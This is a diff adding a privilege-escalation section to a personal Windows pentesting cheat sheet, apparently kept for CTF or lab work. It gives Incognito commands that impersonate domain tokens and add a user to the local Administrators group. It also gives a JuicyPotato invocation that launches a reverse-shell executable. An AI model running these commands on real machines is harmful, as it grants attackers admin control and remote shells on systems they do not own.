@@ -12,7 +12,7 @@
 - [[#Powershell|Powershell]]
 	- [[#Powershell#Enumeration|Enumeration]]
 - [[#SMB - 445|SMB - 445]]
-- [[#SMBMAP|SMBMAP]]
+	- [[#SMB - 445#SMBMAP|SMBMAP]]
 - [[#GUI bypass|GUI bypass]]
 - [[#Auto Elevating|Auto Elevating]]
 - [[#Enviroment Variable|Enviroment Variable]]
@@ -21,6 +21,8 @@
 	- [[#File Operation#BITSAdmin|BITSAdmin]]
 	- [[#File Operation#FindStr|FindStr]]
 	- [[#File Operation#Execution|Execution]]
+- [[#Privilege Escalation|Privilege Escalation]]
+	- [[#Privilege Escalation#Incognito|Incognito]]
 
 
 # Sysinternals
@@ -800,3 +802,26 @@ $snap.LogPipelineExecutionDetails = $false
     - C:\Windows\System32\spool\drivers\color
 - Windows history:
   - %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+
+## Privilege Escalation
+- Check privileges
+	- [Privileges options](https://hackersploit.org/windows-privilege-escalation-fundamentals/)
+- Check potatos
+	- [Potato family](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
+	- [Incognito.exe](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)
+
+### Incognito
+.\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe
+- Create user with admin:
+```
+.\incognito add_user NAME PASS
+.\incognito add_localgroup_user Administrators NAME
+```
+
+### Potato family
+- [More info](https://0xaniket.medium.com/tryhackme-retro-walkthrough-b1197c3c05fb)
+- Privilege **SeImpersonatePrivilege** and/or **SeAssignPrimaryTokenPrivilege**
+- JuicyPotato
+	- [releases](https://github.com/ohpe/juicy-potato/releases)
+	- juicypotato.exe -l PORT -p REVSHELL.exe -t * -c {[FIND_CLSID](https://ohpe.it/juicy-potato/CLSID/)]}
